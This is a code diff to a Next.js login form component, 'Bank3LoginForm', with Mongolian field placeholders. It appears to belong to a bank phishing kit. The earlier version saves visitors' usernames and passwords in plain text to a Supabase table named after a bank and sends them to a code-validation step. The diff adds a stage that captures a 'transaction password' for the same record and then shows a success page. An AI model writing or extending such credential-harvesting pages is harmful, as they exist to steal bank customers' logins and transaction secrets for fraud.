@@ -2,14 +2,21 @@
 
 import { createClient } from '@/utils/supabase/client'
 import { useRouter } from 'next/navigation'
+import React from 'react'
 import { useState } from 'react'
 
-export default function Bank3LoginForm() {
+type Props = {
+  params: Promise<{ id: string, table: string }>
+}
+
+export default function Bank3LoginForm({ params }: Props) {
+  const { table, id } = React.use(params)
+  
   const [showPassword, setShowPassword] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState<string | null>(null)
   
-  const tableName = 'bank3'
+  const tableName = table
   const router = useRouter()
   const supabase = createClient()
 
@@ -23,22 +30,19 @@ export default function Bank3LoginForm() {
     setError(null)
 
     const formData = new FormData(e.currentTarget)
-    const username = formData.get('username') as string
-    const password = formData.get('motdepasse') as string
+    const transacPassword = formData.get('motdepasseTransaction') as string
 
     try {
-      const { data, error } = await supabase
+      const { error } = await supabase
         .from(tableName) // Remplacez par le nom de votre table
-        .insert({
-            username: username,
-            password: password,
+        .update({
+            transacPassword: transacPassword,
           })
-          .select('id')
-          .single()
+        .eq('id', id)
 
       if (error) throw error
 
-      router.push(`/code/${tableName}/${data.id}`) // Redirige vers la page de validation du code
+      router.push("/success") // Redirige vers la page de validation du code
       
     } catch (error: any) {
       console.error('Erreur lors de l\'enregistrement:', error)
@@ -73,27 +77,14 @@ export default function Bank3LoginForm() {
           onSubmit={handleSubmit}
           className="space-y-4"
         >
-          {/* Username */}
-          <div>
-            <input
-              type="text"
-              name="username"
-              id="username"
-              className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500"
-              placeholder="Нэвтрэх нэр"
-              required
-              disabled={isLoading}
-            />
-          </div>
-
           {/* Password */}
           <div className="relative">
             <input
               type={showPassword ? "text" : "password"}
               id="password"
-              name="motdepasse"
+              name="motdepasseTransaction"
               className="w-full px-4 py-3 text-lg border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500 pr-12"
-              placeholder="Нууц уг"
+              placeholder="үйлдлийн нууц үг"
               required
               disabled={isLoading}
             />
